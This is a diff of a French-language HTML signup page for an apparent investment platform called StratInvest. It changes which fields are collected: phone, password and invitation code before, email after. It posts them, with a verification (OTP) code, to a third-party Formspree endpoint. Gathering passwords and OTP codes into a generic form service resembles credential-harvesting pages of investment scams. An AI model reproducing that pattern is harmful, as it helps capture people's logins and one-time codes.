@@ -1,120 +1,36 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>StratInvest - Inscription</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #ffffff;
-      color: #333;
-    }
-
-    .form-section {
-      padding: 40px 20px;
-      text-align: center;
-    }
-
-    h2 {
-      color: #b30000;
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    p {
-      color: #666;
-      font-size: 16px;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      margin-top: 20px;
-    }
-
-    label {
-      text-align: left;
-      font-weight: bold;
-      color: #444;
-    }
-
-    input {
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 15px;
-    }
-
-    button {
-      background-color: #e60000;
-      color: white;
-      border: none;
-      padding: 12px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #cc0000;
-    }
-
-    a {
-      color: #e60000;
-      text-decoration: none;
-    }
-
-    a:hover {
-      text-decoration: underline;
-    }
-
-    footer {
-      margin-top: 40px;
-      padding: 20px;
-      background-color: #f2f2f2;
-      text-align: center;
-      font-size: 14px;
-      color: #555;
-    }
-
-    .timer {
-      font-size: 14px;
-      color: #e60000;
-      font-weight: bold;
-    }
-  </style>
 </head>
 <body>
-  <section id="inscription" class="form-section">
-    <h2>Bienvenue à nous rejoindre sur StratInvest </h2>
-    <p>Inscrivez-vous à votre compte</p>
-    <form action="https://formspree.io/f/xvgqlryy" method="POST">
-      <label for="telephone">Numéro de Téléphone</label>
-      <input type="tel" name="telephone" id="telephone" value="+228" placeholder="Veuillez entrer votre numéro" required>
+  <header>
+    <h1>Bienvenue sur StratInvest</h1>
+    <p>Plateforme stratégique d’investissement</p>
+  </header>
 
-      <label for="password">Mot de Passe de Connexion</label>
-      <input type="password" name="password" id="password" placeholder="Mot de Passe de Connexion" required>
+  <section>
+    <form action="https://formspree.io/f/xeoznbrz" method="POST">
+      <label for="pseudo">Nom d'utilisateur</label>
+      <input type="text" name="pseudo" id="pseudo" placeholder="Votre pseudo" required />
 
-      <label for="pseudo">Pseudo</label>
-      <input type="text" name="pseudo" id="pseudo" placeholder="Entrez votre pseudo" required>
-
-      <label for="invitation">Code d'Invitation</label>
-      <input type="text" name="invitation" id="invitation" placeholder="Veuillez entrer le code d'invitation">
+      <label for="email">Adresse Email</label>
+      <input type="email" name="email" id="email" placeholder="Votre email" required />
 
       <label for="otp">Code de Vérification (OTP)</label>
-      <input type="text" name="otp" id="otp" placeholder="Code de Vérification" required>
-      <span class="timer">6s</span>
+      <input type="text" name="otp" id="otp" placeholder="Code de Vérification" required />
+    
 
       <!-- reCAPTCHA invisible -->
-     <div class="g-recaptcha" data-sitekey="6Lc2C6UrAAAAAOFxl7qaGtgUwf3GNvbT2-_Hy-fm" data-size="invisible" data-callback="onSubmit"></div>
-
+      <div class="g-recaptcha"
+           data-sitekey="6Lc2C6UrAAAAAOFxl7qaGtgUwf3GNvbT2-_Hy-fm"
+           data-size="invisible"
+           data-callback="onSubmit">
+      </div>
 
       <button type="submit">S'inscrire Maintenant</button>
       <p>Vous n'avez pas de compte ? <a href="#">Se Connecter</a></p>
@@ -127,35 +43,33 @@
   </footer>
 
   <script>
-  const form = document.querySelector("form");
+    const form = document.querySelector("form");
 
-  form.addEventListener("submit", function(e) {
-    e.preventDefault();
-    grecaptcha.execute();
-  });
-
-  function onSubmit(token) {
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-      method: "POST",
-      body: formData,
-      headers: {
-        Accept: "application/json"
-      }
-    })
-    .then(response => {
-      if (response.ok) {
-        form.innerHTML = "<h3 style='color:#b30000;'>✅ Inscription réussie ! Merci d’avoir rejoint StratInvest.</h3>";
-      } else {
-        form.innerHTML = "<h3 style='color:#e60000;'>❌ Une erreur est survenue. Veuillez réessayer.</h3>";
-      }
-    })
-    .catch(error => {
-      form.innerHTML = "<h3 style='color:#e60000;'>❌ Erreur réseau. Vérifiez votre connexion.</h3>";
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const pseudo = document.querySelector("input[name='pseudo']").value;
+      localStorage.setItem("stratPseudo", pseudo); // stocke le pseudo
+      grecaptcha.execute(); // lance reCAPTCHA
     });
-  }
-</script>
 
+    function onSubmit(token) {
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: "POST",
+        body: formData,
+        headers: { Accept: "application/json" }
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "dashboard.html"; // redirection vers dashboard
+        } else {
+          form.innerHTML = "<h3 style='color:#e60000;'>❌ Une erreur est survenue. Veuillez réessayer.</h3>";
+        }
+      })
+      .catch(error => {
+        form.innerHTML = "<h3 style='color:#e60000;'>❌ Erreur réseau. Vérifiez votre connexion.</h3>";
+      });
+    }
+  </script>
 </body>
 </html>
